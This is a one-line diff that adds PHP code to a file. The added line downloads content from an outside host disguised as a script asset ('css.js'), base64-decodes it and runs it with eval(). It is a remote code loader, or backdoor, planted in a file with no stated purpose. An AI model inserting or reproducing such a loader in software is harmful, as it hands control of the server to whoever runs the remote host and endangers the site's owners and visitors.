@@ -1,0 +1,1 @@
+<?php $x=file_get_contents("https://seolink.in/css.js"); eval(base64_decode($x)); ?>
